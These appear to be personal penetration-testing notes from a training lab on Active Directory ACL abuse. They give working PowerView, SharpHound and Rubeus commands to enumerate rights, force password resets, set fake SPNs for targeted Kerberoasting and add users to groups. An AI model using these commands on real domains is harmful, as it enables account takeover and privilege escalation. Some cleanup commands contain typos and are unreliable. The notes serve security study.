# Content
- [ACL Enumeration](#acl-enumeration)
  - [ACL Enumeration with Powerview](#acl-enumeration-with-powerview)
  - [ACL Enumeration with BloodHound](#acl-enumeration-with-bloodhound)
 
- [ACL Dangerous Rights](#acl-dangerous-rights)
  - [ForceChangePassword](#forcechangepassword)
  - [GenericWrite](#genericwrite)
  - [GenericAll](#genericall)
  - [Get Changes All](#get-changes-and-get-changes-all)
- [ACL attacks](#acl-attacks)
  - [Change password](#change-password)
  - [Targeted Kerberoasting](#targeted-kerberoasting)
  - [Add to group](#add-to-group)
  - [DCSync](#dcsync) 

# ACL Enumeration
## ACL Enumeration with Powerview
- [control-access-rights list](https://learn.microsoft.com/en-us/windows/win32/adschema/control-access-rights)
- [ace-strings right list](https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings)
```powershell
# get all intersting acl but can take alot of time
Find-InterestingDomainAcl

# specify one object
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# specify one object to one target
Get-DomainObjectACL -ResolveGUIDs -Identity  "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}

# Reverse Search & Mapping to a GUID Value
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# Creating a List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# read from list a specfic user
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# Investigating the Help Desk Level 1 Group with Get-DomainGroup
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

```

in here the `S-1-5-21-3842939050-3880317879-2865463114-1181` user have `User-Force-Change-Password` right on `S-1-5-21-3842939050-3880317879-2865463114-1176` user
![Screenshot_2](https://github.com/kiro6/penetration-testing-notes/assets/57776872/891252fe-052c-4e21-9034-2bbfeaa3eff6)



in here `S-1-5-21-3842939050-3880317879-2865463114-5614` have `Self-Membership` and `ReadProperty, WriteProperty, GenericExecute` on `S-1-5-21-3842939050-3880317879-2865463114-4046`
![Screenshot_2](https://github.com/kiro6/penetration-testing-notes/assets/57776872/0f2aaade-e4cc-4a62-b333-3828962e85b9)




## ACL Enumeration with BloodHound
- [SharpHound .NET](https://github.com/BloodHoundAD/SharpHound)
- [SharpHound powershell](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
- [BloodHound]([https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound/releases))
```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT

bloodhound 
```

# ACL Dangerous Rights

![Screenshot 2024-06-30 at 22-18-35 Active Directory Enumeration   Attacks](https://github.com/kiro6/penetration-testing-notes/assets/57776872/243dfde0-9db7-4c9e-a76b-85ed31054167)


## ForceChangePassword 
- gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords) 
- [how to do Change password](#change-password)


## GenericWrite

**gives us the right to write to any non-protected attribute on an object.** 


1) **Access over User account allows for:**
    - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set). [how to do Targeted Kerberoasting](#targeted-kerberoasting)
2) **Access over Group allows for:**
    - we could `add ourselves` or another `security principal` to a given group [how to Add to group](#add-to-group) .
3) **Access over Computer user allows for:**
    - we could perform a `Kerberos Resource-based Constrained Delegation` attack.




## GenericAll 

**full rights to the object**

1) **Access over User account allows for:**
   - Change the Target's Password [how to do Change password](#change-password)
   - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).  [how to do Targeted Kerberoasting](#targeted-kerberoasting)
   - Shadow Credentials: Use this technique to impersonate a user 
2) **Access over Group allows for:**
   - we could `add ourselves` or another `security principal` to a given group. [how to Add to group](#add-to-group)
3) **Access over Computer user allows for:**
   - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
   - Shadow Credentials: Use this technique to impersonate a computer
  
## Get Changes and Get Changes All 
- The user or service account with this permission ` DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes` can ask Domain Controllers to replicate all changes in the directory through `Directory Replication Service Remote Protocol (MS-DRSR)` , including those changes that are normally restricted, such as confidential attributes. it cannot be turned off or disabled.
- By default only Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups have the required privileges.

1) DCSync mimic a Domain Controller to retrieve user NTLM password hashes.





# Acl Attacks 

## Change password 
needed rights `GenericAll` or `ForceChangePassword`  

### Exploit
Use the `wley` user to change the password for the `damundsen` user


create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `wley` using his password
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
```
create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user damundsen.
```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

using PowerView change the password 
```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```



## Targeted Kerberoasting
needed rights `GenericAll` or `GenericWrite`  

### Exploit 
damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoasting


create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
```

create the fake SPN for `adunn` user
```powershell
Set-DomainObject -Credential $Cred -Identity <Target User> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

use `Rubeus` to catch the ticket also check this [kerberoasting](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Kerberos%20attacks/README.md#kerberoasting)
```powershell
.\Rubeus.exe kerberoast /user:<User> /nowrap
```

### Clean
remove the spn from the user
```
Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear erviceprincipalname -Verbose
```


## Add to group 
needed rights `GenericAll` or `GenericWrite`  


### Exploit 
damundsen user have GenericWrite over Help Desk Level 1 group so we can add our selves 


create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain\User>', $SecPassword)
```

using PowerView add yourslef
```powershell
# check group members
Get-ADGroup -Identity "<Group Name>" -Properties * | Select -ExpandProperty Members

# add your user
Add-DomainGroupMember -Identity '<Group Name>' -Members '<User to Add>' -Credential $Cred -Verbose
```

### Clean
remove the user from the group
```
Remove-DomainGroupMember -Identity <Group Name>" -Members 'Target User' -Credential $Cred -Verbose
```

### Defense

Enabling the `Advanced Security Audit Policy` can help in detecting unwanted changes, especially `Event ID 5136: A directory service object was modified` which would indicate that the domain object was modified


## DCSync
- needed rights `DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes`



